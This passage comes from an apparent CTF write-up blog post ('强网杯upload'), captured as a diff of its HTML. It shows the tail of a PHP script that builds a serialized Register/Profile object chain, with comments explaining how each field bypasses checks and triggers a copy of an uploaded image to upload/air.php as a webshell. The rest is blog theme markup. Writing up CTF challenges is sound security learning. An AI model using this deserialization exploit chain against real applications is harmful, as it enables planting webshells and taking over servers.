<span class="hljs-variable">$registed</span> =<span class="hljs-number">0</span>;<span class="hljs-comment">//目的是过destruct里的if;</span><br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Profile</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$checker</span> =<span class="hljs-number">0</span> ;<span class="hljs-comment">//目的是绕过index类的检查，防止退出程序</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$filename_tmp</span>=<span class="hljs-string">&quot;./upload/ea6cf191dc7eec7b0e43199e459204e5/fb5c81ed3a220004b71069645f112867.png&quot;</span>;<br>	<span class="hljs-keyword">public</span> <span class="hljs-variable">$upload_menu</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$filename</span>=<span class="hljs-string">&quot;upload/air.php&quot;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$ext</span>=<span class="hljs-number">1</span>;<span class="hljs-comment">//目的是过if来调用复制webshell</span><br>	<span class="hljs-keyword">public</span> <span class="hljs-variable">$img</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$except</span>=<span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;index&quot;</span>=&gt;<span class="hljs-string">&quot;upload_img&quot;</span>);<span class="hljs-comment">//目的是通过__get()魔术方法调用upload_Img函数</span><br>&#125;<br><br><span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> Register();<br><span class="hljs-variable">$a</span>-&gt;checker = <span class="hljs-keyword">new</span> Profile();<span class="hljs-comment">//目的是调用POP链</span><br><span class="hljs-variable">$a</span>-&gt;checker-&gt;checker=<span class="hljs-number">0</span>;<span class="hljs-comment">//调用pop链防止退出程序</span><br><br><span class="hljs-keyword">echo</span> base64_encode(serialize(<span class="hljs-variable">$a</span>));<br><br></code></pre></td></tr></table></figure>
 
-</div><div class="article-licensing box"><div class="licensing-title"><p>强网杯upload</p><p><a href="http://example.com/2021/10/10/强网杯upload/">http://example.com/2021/10/10/强网杯upload/</a></p></div><div class="licensing-meta level is-mobile"><div class="level-left"><div class="level-item is-narrow"><div><h6>Author</h6><p>Air</p></div></div><div class="level-item is-narrow"><div><h6>Posted on</h6><p>2021-10-10</p></div></div><div class="level-item is-narrow"><div><h6>Updated on</h6><p>2021-10-10</p></div></div><div class="level-item is-narrow"><div><h6>Licensed under</h6><p><a class="icons" rel="noopener" target="_blank" title="Creative Commons" href="https://creativecommons.org/"><i class="icon fab fa-creative-commons"></i></a><a class="icons" rel="noopener" target="_blank" title="Attribution" href="https://creativecommons.org/licenses/by/4.0/"><i class="icon fab fa-creative-commons-by"></i></a><a class="icons" rel="noopener" target="_blank" title="Noncommercial" href="https://creativecommons.org/licenses/by-nc/4.0/"><i class="icon fab fa-creative-commons-nc"></i></a></p></div></div></div></div></div><div class="notification is-danger">You need to set <code>install_url</code> to use ShareThis. Please set it in <code>_config.yml</code>.</div></article></div><div class="card"><div class="card-content"><h3 class="menu-label has-text-centered">Like this article? Support the author with</h3><div class="buttons is-centered"><a class="button donate" href="/" target="_blank" rel="noopener" data-type="afdian"><span class="icon is-small"><i class="fas fa-charging-station"></i></span><span>Afdian.net</span></a><a class="button donate" data-type="alipay"><span class="icon is-small"><i class="fab fa-alipay"></i></span><span>Alipay</span><span class="qrcode"><img src="/" alt="Alipay"></span></a><a class="button donate" href="/" target="_blank" rel="noopener" data-type="buymeacoffee"><span class="icon is-small"><i class="fas fa-coffee"></i></span><span>Buy me a coffee</span></a><a class="button donate" href="/" target="_blank" rel="noopener" data-type="patreon"><span class="icon is-small"><i class="fab fa-patreon"></i></span><span>Patreon</span></a><div class="notification is-danger">You forgot to set the <code>business</code> or <code>currency_code</code> for Paypal. Please set it in <code>_config.yml</code>.</div><a class="button donate" data-type="wechat"><span class="icon is-small"><i class="fab fa-weixin"></i></span><span>Wechat</span><span class="qrcode"><img src="/" alt="Wechat"></span></a></div></div></div><nav class="post-navigation mt-4 level is-mobile"><div class="level-start"><a class="article-nav-prev level level-item link-muted" href="/2021/10/12/GXYCTF2019StrongestMind/"><i class="level-item fas fa-chevron-left"></i><span class="level-item">GXYCTF2019StrongestMind</span></a></div><div class="level-end"><a class="article-nav-next level level-item link-muted" href="/2021/10/07/CNSS/"><span class="level-item">CSNN</span><i class="level-item fas fa-chevron-right"></i></a></div></nav><div class="card"><div class="card-content"><h3 class="title is-5">Comments</h3><div class="notification is-danger">You forgot to set the <code>shortname</code> for Disqus. Please set it in <code>_config.yml</code>.</div></div></div></div><div class="column column-left is-4-tablet is-4-desktop is-4-widescreen  order-1"><div class="card widget" data-type="profile"><div class="card-content"><nav class="level"><div class="level-item has-text-centered flex-shrink-1"><div><figure class="image is-128x128 mx-auto mb-2"><img class="avatar" src="/img/1.png" alt="Air"></figure><p class="title is-size-4 is-block" style="line-height:inherit;">Air</p><p class="is-size-6 is-block">吾善养吾浩然气</p><p class="is-size-6 is-flex justify-content-center"><i class="fas fa-map-marker-alt mr-1"></i><span>中国 海口</span></p></div></div></nav><nav class="level is-mobile"><div class="level-item has-text-centered is-marginless"><div><p class="heading">Posts</p><a href="/archives"><p class="title">11</p></a></div></div><div class="level-item has-text-centered is-marginless"><div><p class="heading">Categories</p><a href="/categories"><p class="title">0</p></a></div></div><div class="level-item has-text-centered is-marginless"><div><p class="heading">Tags</p><a href="/tags"><p class="title">0</p></a></div></div></nav><div class="level"><a class="level-item button is-primary is-rounded" href="https://github.com/airkqx" target="_blank" rel="noopener">Follow</a></div><div class="level is-mobile is-multiline"><a class="level-item button is-transparent is-marginless" target="_blank" rel="noopener" title="Github" href="https://github.com/airkqx"><i class="fab fa-github"></i></a><a class="level-item button is-transparent is-marginless" target="_blank" rel="noopener" title="RSS" href="/"><i class="fas fa-rss"></i></a></div></div></div><!--!--><div class="card widget" data-type="links"><div class="card-content"><div class="menu"><h3 class="menu-label">Links</h3><ul class="menu-list"><li><a class="level is-mobile" href="https://hexo.io" target="_blank" rel="noopener"><span class="level-left"><span class="level-item">Hexo</span></span><span class="level-right"><span class="level-item tag">hexo.io</span></span></a></li><li><a class="level is-mobile" href="https://bulma.io" target="_blank" rel="noopener"><span class="level-left"><span class="level-item">Bulma</span></span><span class="level-right"><span class="level-item tag">bulma.io</span></span></a></li></ul></div></div></div><!--!--><div class="card widget" data-type="recent-posts"><div class="card-content"><h3 class="menu-label">Recents</h3><article class="media"><div class="media-content"><p class="date"><time dateTime="2022-01-02T13:50:00.000Z">2022-01-02</time></p><p class="title"><a href="/2022/01/02/%E7%BB%992021%E6%9D%A5%E6%AE%B5%E6%80%BB%E7%BB%93/">给2021来段总结</a></p></div></article><article class="media"><div class="media-content"><p class="date"><time dateTime="2021-12-09T11:41:29.000Z">2021-12-09</time></p><p class="title"><a href="/2021/12/09/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%9C%80%E5%85%A8%E9%9D%A2%E7%9A%84%E6%80%BB%E7%BB%93/">PHP命令执行最全面的总结</a></p></div></article><article class="media"><div class="media-content"><p class="date"><time dateTime="2021-10-31T12:14:14.000Z">2021-10-31</time></p><p class="title"><a href="/2021/10/31/%E6%89%8B%E6%8A%8A%E6%89%8B%E6%90%AD%E4%B8%80%E4%B8%AA%E9%9D%B6%E5%9C%BA%E5%B9%B6%E5%87%BA%E9%A2%98/">手把手搭一个靶场并出题</a></p></div></article><article class="media"><div class="media-content"><p class="date"><time dateTime="2021-10-30T08:08:40.000Z">2021-10-30</time></p><p class="title"><a href="/2021/10/30/life/">Life</a></p></div></article><article class="media"><div class="media-content"><p class="date"><time dateTime="2021-10-27T12:40:38.000Z">2021-10-27</time></p><p class="title"><a href="/2021/10/27/hero/">hero</a></p></div></article></div></div><div class="card widget" data-type="archives"><div class="card-content"><div class="menu"><h3 class="menu-label">Archives</h3><ul class="menu-list"><li><a class="level is-mobile" href="/archives/2022/01/"><span class="level-start"><span class="level-item">January 2022</span></span><span class="level-end"><span class="level-item tag">1</span></span></a></li><li><a class="level is-mobile" href="/archives/2021/12/"><span class="level-start"><span class="level-item">December 2021</span></span><span class="level-end"><span class="level-item tag">1</span></span></a></li><li><a class="level is-mobile" href="/archives/2021/10/"><span class="level-start"><span class="level-item">October 2021</span></span><span class="level-end"><span class="level-item tag">8</span></span></a></li><li><a class="level is-mobile" href="/archives/2021/08/"><span class="level-start"><span class="level-item">August 2021</span></span><span class="level-end"><span class="level-item tag">1</span></span></a></li></ul></div></div></div><!--!--><div class="card widget" data-type="subscribe-email"><div class="card-content"><div class="menu"><h3 class="menu-label">Subscribe for updates</h3><form action="https://feedburner.google.com/fb/a/mailverify" method="post" target="popupwindow" onsubmit="window.open(&#039;https://feedburner.google.com/fb/a/mailverify?uri=&#039;,&#039;popupwindow&#039;,&#039;scrollbars=yes,width=550,height=520&#039;);return true"><input type="hidden" value="" name="uri"><input type="hidden" name="loc" value="en_US"><div class="field has-addons"><div class="control has-icons-left is-expanded"><input class="input" name="email" type="email" placeholder="Email"><span class="icon is-small is-left"><i class="fas fa-envelope"></i></span></div><div class="control"><input class="button" type="submit" value="Subscribe"></div></div></form></div></div></div><div class="card widget"><div class="card-content"><div class="notification is-danger">You need to set <code>client_id</code> and <code>slot_id</code> to show this AD unit. Please set it in <code>_config.yml</code>.</div></div></div><div class="card widget" data-type="subscribe-email"><div class="card-content"><div class="menu"><h3 class="menu-label">follow.it</h3><form action="" method="post" target="_blank"><div class="field has-addons"><div class="control has-icons-left is-expanded"><input class="input" name="email" type="email" placeholder="Email"><span class="icon is-small is-left"><i class="fas fa-envelope"></i></span></div><div class="control"><input class="button" type="submit" value="Subscribe"></div></div></form></div></div></div></div><!--!--></div></div></section><footer class="footer"><div class="container"><div class="level"><div class="level-start"><a class="footer-logo is-block mb-2" href="/"><img src="/img/logo.svg" alt="Air" height="28"></a><p class="is-size-7"><span>&copy; 2022 Air</span>  Powered by <a href="https://hexo.io/" target="_blank" rel="noopener">Hexo</a> &amp; <a href="https://github.com/ppoffice/hexo-theme-icarus" target="_blank" rel="noopener">Icarus</a></p></div><div class="level-end"><div class="field has-addons"><p class="control"><a class="button is-transparent is-large" target="_blank" rel="noopener" title="Creative Commons" href="https://creativecommons.org/"><i class="fab fa-creative-commons"></i></a></p><p class="control"><a class="button is-transparent is-large" target="_blank" rel="noopener" title="Attribution 4.0 International" href="https://creativecommons.org/licenses/by/4.0/"><i class="fab fa-creative-commons-by"></i></a></p><p class="control"><a class="button is-transparent is-large" target="_blank" rel="noopener" title="Download on GitHub" href="https://github.com/ppoffice/hexo-theme-icarus"><i class="fab fa-github"></i></a></p></div></div></div></div></footer><script src="https://cdn.jsdelivr.net/npm/jquery@3.3.1/dist/jquery.min.js"></script><script src="https://cdn.jsdelivr.net/npm/moment@2.22.2/min/moment-with-locales.min.js"></script><script src="https://cdn.jsdelivr.net/npm/clipboard@2.0.4/dist/clipboard.min.js" defer></script><script>moment.locale("en");</script><script>var IcarusThemeSettings = {
-            article: {
-                highlight: {
-                    clipboard: true,
-                    fold: 'unfolded'
-                }
-            }
-        };</script><script src="/js/column.js"></script><script src="/js/animation.js"></script><a id="back-to-top" title="Back to top" href="javascript:;"><i class="fas fa-chevron-up"></i></a><script src="/js/back_to_top.js" defer></script><!--!--><!--!--><!--!--><script src="https://cdn.jsdelivr.net/npm/cookieconsent@3.1.1/build/cookieconsent.min.js" defer></script><script>window.addEventListener("load", () => {
-      window.cookieconsent.initialise({
-        type: "info",
-        theme: "edgeless",
-        static: false,
-        position: "bottom-left",
-        content: {
-          message: "This website uses cookies to improve your experience.",
-          dismiss: "Got it!",
-          allow: "Allow cookies",
-          deny: "Decline",
-          link: "Learn more",
-          policy: "Cookie Policy",
-          href: "https://www.cookiesandyou.com/",
-        },
-        palette: {
-          popup: {
-            background: "#edeff5",
-            text: "#838391"
-          },
-          button: {
-            background: "#4b81e8"
-          },
-        },
-      });
-    });</script><script src="https://cdn.jsdelivr.net/npm/lightgallery@1.6.8/dist/js/lightgallery.min.js" defer></script><script src="https://cdn.jsdelivr.net/npm/justifiedGallery@3.7.0/dist/js/jquery.justifiedGallery.min.js" defer></script><script>window.addEventListener("load", () => {
-            if (typeof $.fn.lightGallery === 'function') {
-                $('.article').lightGallery({ selector: '.gallery-item' });
-            }
-            if (typeof $.fn.justifiedGallery === 'function') {
-                if ($('.justified-gallery > p > .gallery-item').length) {
-                    $('.justified-gallery > p > .gallery-item').unwrap();
-                }
-                $('.justified-gallery').justifiedGallery();
-            }
-        });</script><!--!--><!--!--><!--!--><!--!--><!--!--><script src="/js/main.js" defer></script><div class="searchbox"><div class="searchbox-container"><div class="searchbox-header"><div class="searchbox-input-container"><input class="searchbox-input" type="text" placeholder="Type something..."></div><a class="searchbox-close" href="javascript:;">×</a></div><div class="searchbox-body"></div></div></div><script src="/js/insight.js" defer></script><script>document.addEventListener('DOMContentLoaded', function () {
-            loadInsight({"contentUrl":"/content.json"}, {"hint":"Type something...","untitled":"(Untitled)","posts":"Posts","pages":"Pages","categories":"Categories","tags":"Tags"});
-        });</script></body></html>
+
+            </div>
+            <hr>
+            <div>
+              <div class="post-metas mb-3">
+                
+                
+              </div>
+              
+                <p class="note note-warning">
+                  
+                    本博客所有文章除特别声明外，均采用 <a target="_blank" href="https://creativecommons.org/licenses/by-sa/4.0/deed.zh" rel="nofollow noopener noopener">CC BY-SA 4.0 协议</a> ，转载请注明出处！
+                  
+                </p>
+              
+              
+                <div class="post-prevnext">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2021/10/12/GXYCTF2019StrongestMind/">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">GXYCTF2019StrongestMind</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2021/10/07/CNSS/">
+                        <span class="hidden-mobile">CSNN</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+    
+      <div class="d-none d-lg-block col-lg-2 toc-container" id="toc-ctn">
+        <div id="toc">
+  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;目录</p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+      </div>
+    
+  </div>
+</div>
+
+<!-- Custom -->
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v"
+                 for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+    
+
+    
+  </main>
+
+  <footer class="text-center mt-5 py-3">
+  <div class="footer-content">
+     <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+  </div>
+  
+
+  
+
+  
+</footer>
+
+
+  <!-- SCRIPTS -->
+  
+  <script  src="https://cdn.jsdelivr.net/npm/nprogress@0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/nprogress@0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js" ></script>
+<script  src="https://cdn.jsdelivr.net/npm/bootstrap@4/dist/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+<!-- Plugins -->
+
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+  
+
+
+
+  
+    <script  src="https://cdn.jsdelivr.net/npm/tocbot@4/dist/tocbot.min.js" ></script>
+  
+  
+    <script  src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3/dist/jquery.fancybox.min.js" ></script>
+  
+  
+    <script  src="https://cdn.jsdelivr.net/npm/anchor-js@4/anchor.min.js" ></script>
+  
+  
+    <script defer src="https://cdn.jsdelivr.net/npm/clipboard@2/dist/clipboard.min.js" ></script>
+  
+
+
+
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/typed.js@2/lib/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var title = document.getElementById('subtitle').title;
+      
+        typing(title);
+      
+    })(window, document);
+  </script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<!-- 主题的启动项 保持在最底部 -->
+<script  src="/js/boot.js" ></script>
+
+
+</body>
+</html>
